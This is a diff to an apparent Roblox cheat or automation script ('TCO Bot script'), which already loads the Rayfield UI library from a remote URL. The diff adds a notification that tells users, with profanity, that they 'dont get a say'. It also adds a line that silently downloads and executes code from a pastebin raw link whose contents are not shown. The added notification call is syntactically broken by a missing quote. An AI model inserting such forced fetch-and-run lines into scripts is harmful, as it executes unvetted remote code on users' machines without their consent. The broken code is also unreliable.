@@ -1,5 +1,14 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+local starterGui = game:GetService("StarterGui")
+starterGui:SetCore("SendNotification, {
+	Title = "Debug auto enabled",
+	Text = "you dont get a fucking say cuz i need consoles for feedback",
+	Duration = 5
+})
+
+loadstring(game:HttpGet("https://pastebin.com/raw/YXSHujtU"))()
+
 local Window = Rayfield:CreateWindow({
 	Name = "TCO Bot script",
 	Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
